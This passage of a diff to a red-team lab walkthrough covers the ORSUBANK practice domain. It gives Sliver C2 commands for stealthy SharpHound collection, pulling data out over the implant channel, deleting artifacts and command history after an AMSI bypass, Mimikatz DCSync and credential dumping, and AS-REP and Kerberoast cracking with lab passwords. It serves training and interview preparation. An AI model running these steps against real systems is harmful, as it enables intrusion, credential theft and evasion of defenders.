+```bash
+# In Sliver console - interacting with WS01 session
+
+sliver (IMPLANT_NAME) > execute-assembly /opt/red-team-tools/SharpHound.exe -c All
+
+# What happens:
+# 1. Sliver reads SharpHound.exe from your Kali disk
+# 2. Sends bytes to implant over encrypted HTTPS
+# 3. Implant loads .NET assembly in memory
+# 4. Executes with arguments "-c All"
+# 5. Output returned to you
+
+# Expected output:
+# ------------------------------------------------
+# Initializing SharpHound at 10:30 AM on 12/29/2024
+# ------------------------------------------------
+# Resolved Collection Methods: Group, LocalAdmin, Session...
+# [+] Creating Schema map for domain ORSUBANK.LOCAL
+# Status: 0 objects finished (+0) -- Using 35 MB RAM
+# [+] Enumeration complete! 45 objects in 00:00:05
+# Compressing data to .\20241229103000_BloodHound.zip
+```
+
+### Step 6.4.2: Stealth Collection (Recommended)
+
+```bash
+# STEALTHIER APPROACH - Avoid noisy collection methods
+
+sliver (IMPLANT_NAME) > execute-assembly /opt/red-team-tools/SharpHound.exe -c DCOnly
+
+# -c DCOnly only queries the Domain Controller
+# Much less network noise than -c All
+# Doesn't touch every workstation
+# Gets most important data (users, groups, ACLs)
+
+# OR for session hunting specifically:
+sliver (IMPLANT_NAME) > execute-assembly /opt/red-team-tools/SharpHound.exe -c Session
+
+# -c Session finds who's logged in where
+# Useful for credential hunting
+```
+
+### Step 6.4.3: Understanding Collection Methods for Stealth
+
+```
+SHARPHOUND COLLECTION METHODS - RANKED BY STEALTH:
+────────────────────────────────────────────────────────────────
+
+MOST STEALTHY (Recommended):
+─────────────────────────────
+-c DCOnly     → Only queries DC, no touching workstations
+-c Group      → Only group memberships
+-c Trusts     → Domain trust relationships
+
+MEDIUM NOISE:
+─────────────
+-c ObjectProps → Object properties from DC
+-c ACL        → Access control lists from DC
+-c Default    → Basic collection (Group + LocalAdmin + Session)
+
+NOISY (Avoid if possible):
+──────────────────────────
+-c Session    → Touches every computer to check sessions
+-c LocalAdmin → Queries every computer for local admins
+-c RDP        → Checks RDP access on all computers
+-c All        → Everything! Very noisy!
+
+RECOMMENDATION FOR ORSUBANK:
+────────────────────────────
+1. First run: -c DCOnly (get users, groups, ACLs)
+2. If needed: -c Session (find admin sessions)
+3. Only if required: -c All (full enumeration)
+```
+
+---
+
+## Part 6.5: The Output File Problem
+
+```
+WHERE DOES SHARPHOUND OUTPUT GO?
+────────────────────────────────────────────────────────────────
+
+When you run execute-assembly, SharpHound still writes output to disk!
+
+It creates: C:\Users\vamsi.krishna\20241229103000_BloodHound.zip
+
+PROBLEM:
+─────────
+The ZIP file IS written to disk (in current working directory)
+Defender might scan it when accessed
+
+SOLUTION:
+─────────
+1. Write to a less monitored location
+2. Download immediately via Sliver
+3. Delete the file right after
+```
+
+### Step 6.5.1: Output to Safer Location
+
+```bash
+# Specify output directory with --outputdirectory
+
+sliver (IMPLANT_NAME) > execute-assembly /opt/red-team-tools/SharpHound.exe -c DCOnly --outputdirectory C:\\Windows\\Temp
+
+# Output goes to: C:\Windows\Temp\20241229103000_BloodHound.zip
+# Windows\Temp is less monitored than user folders
+```
+
+### Step 6.5.2: Alternative - Use Random Filename
+
+```bash
+# Use --outputprefix to randomize filename
+
+sliver (IMPLANT_NAME) > execute-assembly /opt/red-team-tools/SharpHound.exe -c DCOnly --outputprefix data --outputdirectory C:\\Windows\\Temp
+
+# Creates: C:\Windows\Temp\data_20241229103000.zip
+# Less suspicious than "BloodHound" in the filename
+```
+
+---
+
+## Part 6.6: Stealthy Data Exfiltration
+
+```
+EXFILTRATION WITH DEFENDER ENABLED:
+────────────────────────────────────────────────────────────────
+
+RISKY METHODS:
+──────────────
+❌ SMB copy to your machine (monitored)
+❌ FTP/HTTP to external server (blocked/logged)
+❌ Email attachment (DLP catches it)
+
+SLIVER C2 EXFILTRATION (BEST):
+──────────────────────────────
+✅ Use Sliver's built-in download command
+✅ Data goes over your existing C2 channel (HTTPS port 443)
+✅ Already encrypted
+✅ Looks like normal HTTPS traffic
+✅ No new connections created
+```
+
+### Step 6.6.1: List Files First
+
+```bash
+# Find the output file
+
+sliver (IMPLANT_NAME) > ls C:\\Windows\\Temp
+
+# Look for your ZIP file:
+# data_20241229103000.zip
+
+# Or search for it:
+sliver (IMPLANT_NAME) > shell
+
+C:\> dir C:\Windows\Temp\*.zip /s /b
+# C:\Windows\Temp\data_20241229103000.zip
+
+C:\> exit
+```
+
+### Step 6.6.2: Download via C2 Channel
+
+```bash
+# Download the file through Sliver's encrypted channel
+
+sliver (IMPLANT_NAME) > download C:\\Windows\\Temp\\data_20241229103000.zip /tmp/bloodhound_data.zip
+
+# Output:
+# [*] Downloaded 'data_20241229103000.zip' (248KB) to '/tmp/bloodhound_data.zip'
+
+# The data traverses:
+# WS01 → HTTPS (port 443) → Kali
+# Encrypted, looks like normal web traffic!
+```
+
+### Step 6.6.3: Clean Up (Critical for Stealth!)
+
+```bash
+# DELETE THE FILE FROM TARGET IMMEDIATELY!
+
+sliver (IMPLANT_NAME) > rm C:\\Windows\\Temp\\data_20241229103000.zip
+
+# Verify it's gone:
+sliver (IMPLANT_NAME) > ls C:\\Windows\\Temp\\data*.zip
+# (should be empty)
+
+# Also clean SharpHound cache if it exists:
+sliver (IMPLANT_NAME) > rm C:\\Windows\\Temp\\*.bin
+```
+
+---
+
+## Part 6.7: Alternative - Using BOFs (Beacon Object Files)
+
+```
+WHAT ARE BOFs?
+────────────────────────────────────────────────────────────────
+
+BOFs = Beacon Object Files (from Cobalt Strike)
+Sliver supports Cobalt Strike BOFs!
+
+BOFs are:
+- Compiled C code that runs in-process
+- Even stealthier than execute-assembly
+- No .NET CLR loaded
+- Harder for EDR to detect
+
+SHARPCOLLECTION BOF:
+────────────────────
+There's a BOF version of BloodHound collection!
+https://github.com/outflanknl/C2-Tool-Collection
+```
+
+### Using BOFs in Sliver
+
+```bash
+# Load BOF extension (if available)
+
+sliver (IMPLANT_NAME) > armory install sharp-collection
+
+# Run the BOF
+sliver (IMPLANT_NAME) > sharp-collection -c DCOnly
+
+# BOF runs entirely in-memory
+# No .NET assembly loaded
+# Stealthier than execute-assembly
+```
+
+---
+
+## Part 6.8: ADRecon Alternative (Built-in PowerShell Evasion)
+
+```
+IF SHARPHOUND IS GETTING CAUGHT:
+────────────────────────────────────────────────────────────────
+
+Sometimes even execute-assembly gets flagged.
+Alternative: Use PowerShell with AMSI bypass!
+
+Since our loader already patched AMSI, PowerShell is "clean"
+```
+
+### Native PowerShell AD Enumeration (No Tools!)
+
+```bash
+# From Sliver, spawn a shell
+
+sliver (IMPLANT_NAME) > shell
+
+# AMSI is already bypassed from our loader
+# These commands work without triggering Defender:
+
+# Find Domain Admins
+C:\> powershell -c "Get-ADGroupMember 'Domain Admins' -Recursive | Select Name"
+
+# Find Kerberoastable accounts
+C:\> powershell -c "Get-ADUser -Filter {ServicePrincipalName -ne '$null'} -Properties ServicePrincipalName | Select Name,ServicePrincipalName"
+
+# Find AS-REP Roastable accounts
+C:\> powershell -c "Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} | Select Name"
+
+# Find computers
+C:\> powershell -c "Get-ADComputer -Filter * | Select Name,DNSHostName"
+
+# Find nested groups
+C:\> powershell -c "Get-ADGroupMember 'Domain Admins' -Recursive | Select Name,objectClass"
+
+C:\> exit
+```
+
+### Export to CSV for Analysis
+
+```bash
+sliver (IMPLANT_NAME) > shell
+
+# Export users to CSV
+C:\> powershell -c "Get-ADUser -Filter * -Properties * | Export-CSV C:\Windows\Temp\users.csv"
+
+# Export groups
+C:\> powershell -c "Get-ADGroup -Filter * | Export-CSV C:\Windows\Temp\groups.csv"
+
+# Export group members
+C:\> powershell -c "Get-ADGroupMember 'Domain Admins' -Recursive | Export-CSV C:\Windows\Temp\da_members.csv"
+
+C:\> exit
+
+# Download
+sliver (IMPLANT_NAME) > download C:\\Windows\\Temp\\users.csv /tmp/
+sliver (IMPLANT_NAME) > download C:\\Windows\\Temp\\groups.csv /tmp/
+sliver (IMPLANT_NAME) > download C:\\Windows\\Temp\\da_members.csv /tmp/
+
+# Clean up
+sliver (IMPLANT_NAME) > rm C:\\Windows\\Temp\\users.csv
+sliver (IMPLANT_NAME) > rm C:\\Windows\\Temp\\groups.csv
+sliver (IMPLANT_NAME) > rm C:\\Windows\\Temp\\da_members.csv
+```
+
+---
+
+## Part 6.9: Setting Up BloodHound on Kali
+
+### Step 6.9.1: Install BloodHound
+
+```bash
+# On Kali (192.168.100.100)
+
+# Install BloodHound and Neo4j
+sudo apt update
+sudo apt install bloodhound neo4j -y
+
+# OR use the new BloodHound Community Edition (Docker)
+# This is the recommended approach now!
+curl -L https://github.com/SpecterOps/BloodHound/releases/latest/download/docker-compose.yml | docker compose -f - up -d
+```
+
+### Step 6.9.2: Start Neo4j (Legacy BloodHound)
+
+```bash
+# Start Neo4j database
+sudo neo4j start
+
+# Wait 30 seconds for it to start
+sleep 30
+
+# Set password (first time only)
+# Open browser: http://localhost:7474
+# Login: neo4j / neo4j
+# Change password to: bloodhound
+```
+
+### Step 6.9.3: Start BloodHound
 
 ```bash
 # Start BloodHound GUI
-bloodhound
+bloodhound &
 
 # Login with:
-# URL: bolt://localhost:7687
+# Bolt URL: bolt://localhost:7687
 # Username: neo4j
 # Password: bloodhound
 ```
 
 ---
 
-# PART 20: Running SharpHound {#part-20-running-sharphound}
+## Part 6.10: Importing Data Into BloodHound
 
-## Step 1: Transfer SharpHound to Target
-
-You need to get SharpHound.exe onto the compromised machine. Using Sliver:
-
-```bash
-# In Sliver console, with your beacon active:
-
-# Upload SharpHound to the target
-sliver (BEACON) > upload /opt/SharpHound/SharpHound.exe C:\\Windows\\Temp\\SharpHound.exe
-
-# Verify it uploaded
-sliver (BEACON) > ls C:\\Windows\\Temp\\SharpHound.exe
-```
-
-## Step 2: Run SharpHound
-
-**Option A: Using execute-assembly (Recommended - stays in memory)**
-
-If you have a .NET assembly version (SharpHound.exe):
-
-```bash
-# Run SharpHound from Sliver using execute-assembly
-sliver (BEACON) > execute-assembly /opt/SharpHound/SharpHound.exe -c All
-```
-
-**Option B: Run directly (writes to disk)**
-
-```bash
-# Run SharpHound directly
-sliver (BEACON) > shell
-
-# In the shell:
-C:\Windows\Temp\SharpHound.exe -c All --outputdirectory C:\Windows\Temp
-```
-
-**What you'll see:**
+### Step 6.10.1: Import the ZIP File
 
 ```
-────────────────────────────────────────────────────────────────
-SharpHound v1.1.0
-────────────────────────────────────────────────────────────────
-[*] Initializing SharpHound at 10:30 AM on 12/28/2024
-[*] Resolved Collection Methods: Group, LocalAdmin, Session, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
-[*] Initializing LDAP connection to DC01.ORSUBANK.LOCAL
-[*] LDAP connection established
-[*] Beginning LDAP collection
-[*] Found 15 computers
-[*] Found 25 users
-[*] Found 50 groups
-[*] Completed enumeration in 00:00:45
-[*] Compressing data to C:\Windows\Temp\20241228103045_BloodHound.zip
-[*] Finished!
-────────────────────────────────────────────────────────────────
+In BloodHound GUI:
+
+1. Click the "Upload Data" button (folder icon, top right)
+2. Navigate to /tmp/bloodhound_data.zip
+3. Select and click "Open"
+4. Wait for import to complete
+
+SUCCESS MESSAGE:
+────────────────
+You should see:
+- Computers: 3 (DC01, WS01, WS02)
+- Users: ~15
+- Groups: ~25
+- Import complete!
 ```
 
-## Step 3: Download the Output File
+### Step 6.10.2: Verify Import Success
 
-```bash
-# Find the file
-sliver (BEACON) > ls C:\\Windows\\Temp\\
+```
+Click "Database Info" (cylinder icon)
 
-# Look for the .zip file with today's date
-# Download it
-sliver (BEACON) > download C:\\Windows\\Temp\\20241228103045_BloodHound.zip /tmp/bloodhound.zip
+EXPECTED FOR ORSUBANK:
+──────────────────────
+Users: 10-15
+Computers: 3
+Groups: 25+
+Sessions: varies (depends on who's logged in)
+ACLs: 100+
 
-# Clean up (delete SharpHound from target)
-sliver (BEACON) > rm C:\\Windows\\Temp\\SharpHound.exe
-sliver (BEACON) > rm C:\\Windows\\Temp\\20241228103045_BloodHound.zip
+If these numbers look right, you're good!
 ```
 
 ---
 
-# PART 21: Importing Data into BloodHound {#part-21-import}
-
-## Step 1: Start BloodHound
-
-If not already running:
-
-```bash
-# Make sure Neo4j is running
-sudo neo4j start
-
-# Start BloodHound
-bloodhound
-```
-
-## Step 2: Upload the Data
-
-1. In BloodHound GUI, click the **Upload Data** button (folder icon in top right)
-2. Select your downloaded zip file (`/tmp/bloodhound.zip`)
-3. Wait for import to complete
-4. You'll see log messages as data is imported
-
-**You should see:**
+## Part 6.11: Operational Security Checklist
 
 ```
-Uploading file...
-Reading data...
-Importing nodes...
-Imported 15 computers
-Imported 25 users  
-Imported 50 groups
-Importing edges...
-Done!
-```
+BEFORE EXFILTRATION - OPSEC CHECKLIST:
+────────────────────────────────────────────────────────────────
 
-## Step 3: Mark Owned Accounts
+✅ AMSI bypass is working (from initial access loader)
+✅ ETW bypass is working (from initial access loader)
+✅ Using execute-assembly (not uploading files)
+✅ Using stealth collection (-c DCOnly first)
+✅ Output to Windows\Temp (less monitored)
+✅ Random output prefix (not "BloodHound")
+✅ Download via C2 channel (not SMB/HTTP)
+✅ Clean up files immediately after download
+✅ No persistent files left on target
 
-**Tell BloodHound which users you control:**
-
-1. Search for your user: Type `vamsi.krishna` in search box
-2. Right-click the user node
-3. Select **Mark User as Owned**
-
-**Now BloodHound knows your starting point!**
-
----
-
-# PART 22: Finding Attack Paths {#part-22-finding-paths}
-
-## Pre-Built Queries
-
-BloodHound has powerful pre-built queries. Click the hamburger menu (three lines) to see them.
-
-**Most Important Queries:**
-
-| Query | What it finds |
-|-------|---------------|
-| "Find all Domain Admins" | Lists all Domain Admin accounts |
-| "Find Shortest Paths to Domain Admins" | Attack paths from any user to DA |
-| "Shortest Paths to Domain Admins from Owned Principals" | Paths from YOUR owned accounts to DA |
-| "Find Computers where Domain Admins are logged in" | DA sessions to target |
-| "Find Kerberoastable Users" | Accounts vulnerable to Kerberoasting |
-| "Find AS-REP Roastable Users" | Accounts with pre-auth disabled |
-
-## Example: Finding a Path
-
-1. Click the three-line menu (top left)
-2. Click **"Shortest Paths to Domain Admins from Owned Principals"**
-3. BloodHound shows a graph visualization of attack paths
-
-**Reading the Graph:**
-
-- **Circles** = Users or Groups
-- **Boxes** = Computers
-- **Arrows** = Relationships (permissions)
-- **Arrow Labels** = What the permission allows
-
-```
-Example Path Visualization:
-
-[vamsi.krishna] --GenericAll--> [lakshmi.devi] --MemberOf--> [IT_Support]
-                                                                   |
-                                                              AdminTo
-                                                                   |
-                                                                   v
-                                                               [WS02]
-                                                                   |
-                                                             HasSession
-                                                                   |
-                                                                   v
-                                                            [pranavi] --MemberOf--> [Domain Admins]
+AFTER ENUMERATION:
+──────────────────
+✅ Delete any temporary files created
+✅ Clear your command history if you used shell
+✅ Check Defender events (if you have access)
+✅ Verify no alerts triggered
 ```
 
 ---
 
-# PART 23: Advanced Queries (Cypher) {#part-23-queries}
+## Part 6.12: Interview Gold - Red Team Methodology
 
-## Custom Cypher Queries
+### Q: How do you run SharpHound without getting detected?
 
-BloodHound uses Neo4j, which uses Cypher query language. You can write custom queries!
+```
+ANSWER FOR INTERVIEWS:
+────────────────────────────────────────────────────────────────
 
-**Click the "Raw Query" button to enter custom queries.**
+"In a real engagement, I follow these steps:
 
-**Useful Custom Queries:**
+1. INITIAL ACCESS WITH EVASION
+   - Use encrypted shellcode loader with AMSI/ETW bypass
+   - Get C2 session without triggering Defender
 
-```cypher
-// Find all users with SPNs (Kerberoastable)
-MATCH (u:User) WHERE u.hasspn=true RETURN u.name
+2. IN-MEMORY EXECUTION
+   - Use C2's execute-assembly capability (Sliver, Cobalt Strike)
+   - SharpHound never touches disk
+   - Runs from memory only
 
-// Find all computers where Domain Admins have sessions
-MATCH (c:Computer)-[:HasSession]->(u:User)-[:MemberOf*1..]->(g:Group)
-WHERE g.name =~ ".*DOMAIN ADMINS.*"
-RETURN c.name, u.name
+3. STEALTH COLLECTION
+   - Start with -c DCOnly (minimal noise)
+   - Only expand to -c All if needed
+   - Avoid touching every workstation
 
-// Find users who can DCSync
-MATCH (u)-[:MemberOf|DCSync*1..]->(d:Domain)
+4. SECURE EXFILTRATION
+   - Download via C2 channel (already encrypted)
+   - No separate exfil connections
+   - Blends with existing C2 traffic
+
+5. CLEANUP
+   - Delete output files immediately
+   - Clear cache files
+   - Verify no artifacts remain
+
+This approach maintains OPSEC while still getting the AD data
+needed for attack path analysis."
+```
+
+### Q: What if execute-assembly gets detected?
+
+```
+ANSWER:
+────────────────────────────────────────────────────────────────
+
+"I have several fallback options:
+
+1. Use BOFs (Beacon Object Files)
+   - Even stealthier than .NET assemblies
+   - No CLR loading
+   - Runs directly in beacon process
+
+2. Native PowerShell enumeration
+   - With AMSI bypassed, PowerShell is clean
+   - Use Get-ADUser, Get-ADGroup directly
+   - Export to CSV for offline analysis
+
+3. LDAP queries from Kali
+   - If I have creds, query DC directly from my box
+   - Tools: ldapsearch, ADExplorer, windapsearch
+   - No execution on target at all
+
+4. Manual enumeration
+   - Query one thing at a time
+   - Less likely to trigger behavior-based detection
+   - Slower but stealthier"
+```
+
+---
+
+# PART 7: FINDING ATTACK PATHS IN ORSUBANK
+
+---
+
+## Part 7.1: Finding Domain Admins
+
+### Step 7.1.1: Run Built-in Query
+
+```
+In BloodHound:
+1. Click "Analysis" tab (hamburger menu)
+2. Click "Find all Domain Admins"
+
+RESULT:
+──────
+You should see:
+- ammulu.orsu (IT Manager)
+- svc_backup (Service Account)
+- Server_Admins (Group) ← Nested!
+- Administrator
+```
+
+### Step 7.1.2: Understand What You See
+
+```
+ORSUBANK DOMAIN ADMINS:
+────────────────────────────────────────────────────────────────
+
+┌─────────────────────────┐
+│     DOMAIN ADMINS       │
+├─────────────────────────┤
+│  ┌─────────────────┐    │
+│  │ ammulu.orsu     │    │ ← Direct member (IT Manager)
+│  └─────────────────┘    │
+│  ┌─────────────────┐    │
+│  │ svc_backup      │    │ ← Direct member (Service Account!)
+│  └─────────────────┘    │
+│  ┌─────────────────┐    │
+│  │ Server_Admins   │    │ ← GROUP is member (nested!)
+│  └─────────────────┘    │
+│  ┌─────────────────┐    │
+│  │ Administrator   │    │ ← Built-in admin
+│  └─────────────────┘    │
+└─────────────────────────┘
+
+svc_backup is a SERVICE ACCOUNT with Domain Admin!
+This is a HUGE finding!
+```
+
+---
+
+## Part 7.2: The Nested Group Attack Path
+
+### Step 7.2.1: Find the Path
+
+```
+In BloodHound:
+1. Search for "harsha.vardhan" in the search bar
+2. Right-click on the node
+3. Select "Shortest Path to Domain Admin"
+
+OR:
+
+1. Click "Analysis"
+2. Click "Shortest Paths to Domain Admins from Domain Users"
+```
+
+### Step 7.2.2: What You'll See
+
+```
+BLOODHOUND WILL SHOW THIS PATH:
+────────────────────────────────────────────────────────────────
+
+                    ┌─────────────┐
+                    │   Domain    │
+                    │   Admins    │
+                    └──────▲──────┘
+                           │
+                    MemberOf
+                           │
+                    ┌──────┴──────┐
+                    │   Server    │
+                    │   _Admins   │
+                    └──────▲──────┘
+                           │
+                    MemberOf
+                           │
+                    ┌──────┴──────┐
+                    │  IT_Support │
+                    └──────▲──────┘
+                           │
+                    MemberOf
+                           │
+                    ┌──────┴──────┐
+                    │ HelpDesk    │
+                    │   _Team     │
+                    └──────▲──────┘
+                           │
+                    MemberOf
+                           │
+                    ┌──────┴──────┐
+                    │   harsha.   │
+                    │   vardhan   │
+                    └─────────────┘
+
+
+ATTACK:
+───────
+1. AS-REP Roast harsha.vardhan
+2. Crack: Customer2024!
+3. Login as harsha.vardhan
+4. You ARE Domain Admin (through nesting)!
+```
+
+---
+
+## Part 7.3: Kerberoastable Accounts
+
+### Step 7.3.1: Find Kerberoastable Accounts
+
+```
+In BloodHound:
+1. Click "Analysis"
+2. Click "List All Kerberoastable Accounts"
+
+RESULT:
+──────
+- sqlservice      (MSSQLSvc/DC01:1433)
+- httpservice     (HTTP/web.orsubank.local)
+- iisservice      (HTTP/app.orsubank.local)
+- backupservice   (MSSQLSvc/DC01:1434)
+- svc_backup      (backup/dc01.orsubank.local) ← DOMAIN ADMIN!
+```
+
+### Step 7.3.2: Identify the High-Value Target
+
+```
+CRITICAL FINDING:
+────────────────────────────────────────────────────────────────
+
+svc_backup is BOTH:
+1. Kerberoastable (has an SPN)
+2. A Domain Admin!
+
+If you crack svc_backup's password, you get Domain Admin!
+
+Password: Backup@2024!
+Hashcat mode: 13100
+```
+
+---
+
+## Part 7.4: AS-REP Roastable Accounts
+
+### Step 7.4.1: Find AS-REP Roastable Accounts
+
+```
+In BloodHound:
+1. Click "Analysis"
+2. Click "Find AS-REP Roastable Users (DoesNotReqPreAuth)"
+
+RESULT:
+──────
+- pranavi
+- harsha.vardhan ← Also leads to DA through groups!
+- kiran.kumar
+```
+
+### Step 7.4.2: The Best Target
+
+```
+BEST TARGET: harsha.vardhan
+────────────────────────────────────────────────────────────────
+
+Why?
+- Can be AS-REP roasted (no pre-auth required)
+- Password: Customer2024! (easy to crack)
+- Is effectively a Domain Admin through nested groups!
+
+Attack:
+1. [Kali] GetNPUsers.py orsubank.local/ -usersfile users.txt -no-pass
+2. Get harsha.vardhan's hash
+3. hashcat -m 18200 hash.txt rockyou.txt
+4. Crack: Customer2024!
+5. Login as harsha.vardhan
+6. You ARE Domain Admin!
+```
+
+---
+
+## Part 7.5: Session Hunting
+
+### Step 7.5.1: Find Where Admins Are Logged In
+
+```
+In BloodHound:
+1. Click "Analysis"
+2. Click "Find Workstations where Domain Admins are logged in"
+
+RESULT:
+──────
+WS01 ← lakshmi.devi (DA session!)
+WS02 ← (check for sessions)
+```
+
+### Step 7.5.2: The Attack
+
+```
+SESSION HUNTING ATTACK:
+────────────────────────────────────────────────────────────────
+
+SCENARIO:
+- You have shell on WS01 as vamsi.krishna
+- lakshmi.devi (DA) logs into WS01 sometimes
+
+ATTACK:
+1. Wait for lakshmi.devi to log in
+2. Run Mimikatz: sekurlsa::logonpasswords
+3. Get her NTLM hash or credentials
+4. Pass-the-hash or login as lakshmi.devi
+5. You ARE Domain Admin!
+
+This is why checking sessions is important!
+```
+
+---
+
+## Part 7.6: DCSync Attack Path
+
+### Step 7.6.1: Find DCSync Rights
+
+```
+In BloodHound:
+1. Click "Analysis"
+2. Click "Find Principals with DCSync Rights"
+
+RESULT:
+──────
+- Domain Controllers (expected)
+- Domain Admins (expected)
+- WS01$ ← MISCONFIGURATION!
+```
+
+### Step 7.6.2: The Attack
+
+```
+DCSYNC FROM WS01:
+────────────────────────────────────────────────────────────────
+
+WS01$ (the computer account) has DCSync rights!
+
+ATTACK:
+1. Get shell on WS01
+2. Escalate to SYSTEM
+3. Run Mimikatz (as SYSTEM, using WS01$'s privileges):
+   
+   mimikatz # lsadump::dcsync /domain:orsubank.local /user:Administrator
+
+4. Get Administrator's NTLM hash
+5. Pass-the-hash as Administrator
+6. You ARE Domain Admin!
+
+
+FROM SLIVER:
+────────────
+sliver > getsystem
+sliver > execute-assembly /opt/tools/mimikatz.exe "lsadump::dcsync /domain:orsubank.local /user:Administrator"
+```
+
+---
+
+# PART 8: ADVANCED QUERIES
+
+---
+
+## Part 8.1: Custom Cypher Queries
+
+```
+BLOODHOUND USES CYPHER QUERY LANGUAGE:
+────────────────────────────────────────────────────────────────
+
+FIND ALL USERS:
+───────────────
+MATCH (n:User) RETURN n
+
+FIND ALL DOMAIN ADMINS:
+───────────────────────
+MATCH (n:Group {name:"DOMAIN ADMINS@ORSUBANK.LOCAL"}) 
+OPTIONAL MATCH (n)<-[r:MemberOf*1..]-(m) 
+RETURN n,m
+
+FIND KERBEROASTABLE DOMAIN ADMINS:
+──────────────────────────────────
+MATCH (u:User {hasspn:true})-[:MemberOf*1..]->(g:Group {name:"DOMAIN ADMINS@ORSUBANK.LOCAL"})
 RETURN u.name
 
-// Find all users with GenericAll on other users
-MATCH (u1:User)-[:GenericAll]->(u2:User)
-RETURN u1.name AS Attacker, u2.name AS Target
+# This will return: svc_backup (the DA service account!)
 
-// Find paths from owned users to Domain Admins (max 5 hops)
-MATCH p=shortestPath((u:User {owned:true})-[*1..5]->(g:Group))
-WHERE g.name =~ ".*DOMAIN ADMINS.*"
+FIND AS-REP ROASTABLE USERS WITH PATH TO DA:
+────────────────────────────────────────────
+MATCH (u:User {dontreqpreauth:true})
+MATCH p=shortestPath((u)-[:MemberOf*1..]->(g:Group {name:"DOMAIN ADMINS@ORSUBANK.LOCAL"}))
 RETURN p
 
-// Find computers where you have admin rights
-MATCH (u:User {owned:true})-[:AdminTo]->(c:Computer)
-RETURN c.name
+# This will show: harsha.vardhan → ... → Domain Admins
+```
+
+### How to Run Custom Queries
+
+```
+In BloodHound:
+1. Click "Raw Query" (bottom of Analysis tab)
+2. Paste your Cypher query
+3. Press Enter
 ```
 
 ---
 
-# PART 24: Interview Questions {#part-24-interview}
-
-## Top BloodHound/AD Enumeration Interview Questions
-
-**Q1: What is BloodHound and why is it useful?**
-
-**Answer:** BloodHound is an Active Directory reconnaissance tool that uses graph theory to find attack paths. It collects data about AD objects (users, groups, computers, ACLs) and visualizes relationships to identify privilege escalation paths. It's useful because it can find complex, multi-hop attack paths that humans would miss.
-
----
-
-**Q2: What is SharpHound?**
-
-**Answer:** SharpHound is the data collection component of BloodHound. It runs on a compromised Windows machine and queries Active Directory via LDAP to collect information about users, groups, computers, sessions, and ACLs. It outputs a zip file of JSON data that is imported into BloodHound for analysis.
-
----
-
-**Q3: What collection methods does SharpHound support?**
-
-**Answer:** SharpHound supports several collection methods:
-- **Default**: Users, groups, computers, ACLs, trusts
-- **Session**: Logged-on users (via NetSessionEnum)
-- **LocalAdmin**: Local administrator relationships
-- **All**: Complete collection of everything
-- **Group**: Just group memberships
-- **ACL**: Access Control Lists only
-
----
-
-**Q4: Explain what GenericAll permission means and how an attacker can abuse it.**
-
-**Answer:** GenericAll is a permission that grants full control over an AD object. If a user has GenericAll on another user, they can:
-- Reset the target's password
-- Modify any attribute on the target
-- Take over the account completely
-
-If the target is a privileged account (like a Domain Admin), this leads to privilege escalation.
-
----
-
-**Q5: What is a "session" in BloodHound context and why is it valuable?**
-
-**Answer:** A session represents where a user is currently logged in. BloodHound collects session data to find computers where high-privilege users (like Domain Admins) are logged in. This is valuable because:
-1. If you gain admin access to that computer
-2. You can dump credentials from memory (LSASS)
-3. You get the Domain Admin's credentials/tickets
-
----
-
-**Q6: How would you use BloodHound output to plan an attack?**
-
-**Answer:**
-1. Mark my compromised accounts as "Owned" in BloodHound
-2. Run the query "Shortest Paths to Domain Admins from Owned Principals"
-3. Analyze the path - what relationships need to be exploited?
-4. For each step, determine the tool/technique needed:
-   - GenericAll → Reset password or add to group
-   - AdminTo → Lateral movement with admin creds
-   - HasSession → Dump credentials from that computer
-5. Execute the attack chain step by step
-
----
-
-**Q7: What is the difference between BloodHound and PowerView?**
-
-**Answer:**
-- **BloodHound**: Visual attack path finder, uses graph database, finds complex multi-hop paths automatically
-- **PowerView**: PowerShell enumeration toolkit, more manual, good for specific queries
-
-BloodHound is better for overall attack planning. PowerView is better for targeted enumeration of specific objects.
-
----
-
-**Q8: Can BloodHound detect Kerberoastable accounts? How?**
-
-**Answer:** Yes. SharpHound collects the servicePrincipalName (SPN) attribute for all users. If a user account has an SPN, it can be Kerberoasted. BloodHound has a pre-built query "Find Kerberoastable Users" that shows all these accounts.
-
----
-
-**Q9: What ports does SharpHound use?**
-
-**Answer:**
-- **Port 389** (LDAP) - Primary port for AD queries
-- **Port 636** (LDAPS) - Encrypted LDAP
-- **Port 445** (SMB) - For session enumeration
-- **Port 135** (RPC) - For some local admin enumeration
-
----
-
-**Q10: How can defenders detect SharpHound execution?**
-
-**Answer:**
-- Monitor for large LDAP queries requesting all objects
-- Watch for enumeration of sensitive attributes (adminCount, servicePrincipalName)
-- Detect NetSessionEnum calls across many computers
-- Look for BloodHound artifacts in memory or on disk
-- Use Windows Event IDs 4662 (Directory Service Access) and 4624 (Logon events)
-
----
-
-# PART 25: Troubleshooting {#part-25-troubleshoot}
-
-## Common Issues and Solutions
-
-**Issue: SharpHound fails with "LDAP connection failed"**
+## Part 8.2: Finding Shortest Paths
 
 ```
-Cause: Cannot reach Domain Controller
-Fix:
-- Check network connectivity: ping DC01
-- Verify DNS resolution: nslookup DC01.orsubank.local
-- Ensure firewall allows port 389
-```
-
-**Issue: Neo4j won't start**
-
-```
-Cause: Usually Java issues or port conflicts
-Fix:
-- Check Neo4j logs: sudo journalctl -u neo4j
-- Verify port 7474/7687 not in use: sudo netstat -tlnp | grep 7474
-- Restart Neo4j: sudo neo4j restart
-```
-
-**Issue: BloodHound shows "No data"**
-
-```
-Cause: Data not imported or database empty
-Fix:
-- Verify import completed successfully
-- Click the refresh button
-- Clear database and re-import: Database menu -> Clear Database
-```
-
-**Issue: "Access Denied" when running SharpHound**
-
-```
-Cause: Insufficient permissions
-Fix:
-- Any domain user should be able to run default collection
-- LocalAdmin collection requires admin rights on targets
-- Try running with just: SharpHound.exe -c Default
-```
-
----
-
-# PART 26: Next Steps {#part-26-next}
-
-## What Comes After Enumeration?
-
-Now that you've mapped the domain with BloodHound, you're ready for the next steps:
-
-```
-YOUR ATTACK PATH:
+SHORTEST PATH FROM OWNED USER TO DA:
 ────────────────────────────────────────────────────────────────
 
-[DONE] Initial Access (Walkthrough 00)
-   |
-   v
-[DONE] Domain Enumeration (This Walkthrough)
-   |
-   v
-[NEXT] Choose Your Attack Based on BloodHound Results:
+1. Mark vamsi.krishna as "Owned":
+   - Search for vamsi.krishna
+   - Right-click → Mark User as Owned
 
-If you found Kerberoastable users:
---> 02_kerberoasting.md
+2. Run Query:
+   - Analysis → "Shortest Paths to Domain Admins from Owned Principals"
 
-If you found AS-REP Roastable users:
